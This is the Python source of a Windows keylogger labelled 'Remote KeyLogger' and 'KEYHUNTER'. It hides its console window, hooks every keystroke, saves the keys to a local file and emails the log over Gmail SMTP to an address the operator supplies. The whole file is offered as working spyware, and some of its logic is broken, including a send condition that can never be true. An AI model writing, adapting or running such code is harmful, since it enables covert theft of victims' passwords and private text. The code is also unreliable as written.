import win32api
import win32console
import win32gui
import pythoncom,pyHook
import time
import datetime
import smtplib
from email.mime.text import MIMEText
import os
import sys

########################################################

# SET UP VARIABLES

########################################################

win=win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)
#create .txt file where keystrokes will be stored
f=open('c:\output.txt','w+')
f.close
email = str(raw_input("# Enter Your Email Address: "))



desc = '''
        +=========================================+
        |............Remote KeyLogger.............|
        +-----------------------------------------+
        |#desc: An open source remote keylogger.  |
        |#Author: Suriyaa Kudo                    |
        |#I take no responsibilities for the      |
        | use of this program!                    |
        +=========================================+
'''
print desc


########################################################

# FUNCTIONS

########################################################

def send_email(message,toaddrs):

    try:
        

        fromaddr = '<createfakeemailadress@provider.tld>'
        username = '<yourorsomeoneelseemail@gmail.com>' #here type you gmail username
        password = '<password of username account>' #heretype you gmail password
        message+="<br><br>" +"BR The Name "
        msg = MIMEText(message, 'html')
        msg['Subject']  = "Keylogger Report -- " +str(datetime.datetime.now()) + " --"
        msg['From']=fromaddr
        msg['Reply-to'] = 'no-reply'
        msg['To'] = toaddrs
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(username,password)
        server.sendmail(fromaddr, [toaddrs], msg.as_string())
        server.quit()
    except:

        print "Error while sending email!!! Contact createfakeemailadress@provider.tld for support!"
            
          

def OnKeyboardEvent(event):
    #press CTRL+E to exit
    if event.Ascii==5:
        sys.exit(0)
    if event.Ascii !=0 or 8:
        #open output.txt to read current keystrokes
        f=open('c:\output.txt','r+')
        buffer=f.read()
        f.close()
        
        if len(buffer)==1:
            send_email("Welcome :) , you start using KEYHUNTER, soon you'll received cool keystrokes",email)
            
        elif len(buffer)%1001==0 and len(buffer)%1001!=0:
            #send last 10000 characters
            send_email(buffer[-10000:].replace("\n","<br>"),email)
        #open output.txt to write current + new keystrokes
        f=open('c:\output.txt','w')
        keylogs=chr(event.Ascii)
        #if user press ENTER 
        if event.Ascii==13:
            keylogs='\n'
        #if user press space    
        if event.Ascii==32:
            keylogs='  '
        buffer+=keylogs
        f.write(buffer)
        f.close()
        #after specific number of charachters send email
        
            
        
########################################################

# BEGIN EXECUTING KEYLOGGER

########################################################



                    
# create a hook manager object
hm=pyHook.HookManager()
hm.KeyDown=OnKeyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()
